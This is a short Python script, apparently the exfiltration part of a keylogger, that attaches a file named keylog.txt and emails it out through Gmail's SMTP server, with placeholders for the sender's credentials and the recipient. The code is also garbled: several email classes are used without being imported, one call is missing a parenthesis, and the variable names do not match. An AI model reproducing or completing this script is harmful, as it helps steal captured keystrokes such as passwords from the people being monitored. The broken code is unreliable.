import smtplib
import email

from_addr = "<enter your email address here>"
to_addr ="<enter the recipient address here>"
message = MIMEMultipart()
message.attach(MIMEText('plain')
file = 'keylog.txt'
attachment = open(file, 'rb')
pld = MIMEBase('application', 'octet-stream')
pld.set_payload((attachment).read())
encoders.encode_base64(pld)
pld.add_header('Content-Disposition', "attachment; filename= %s" % file)
message.attach(pld)

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login(from_addr, "<enter your email password here>")
tex_mail = messageg.as_string()

s.sendmail(from_addr, to_addr, text_mail)
s.quit()
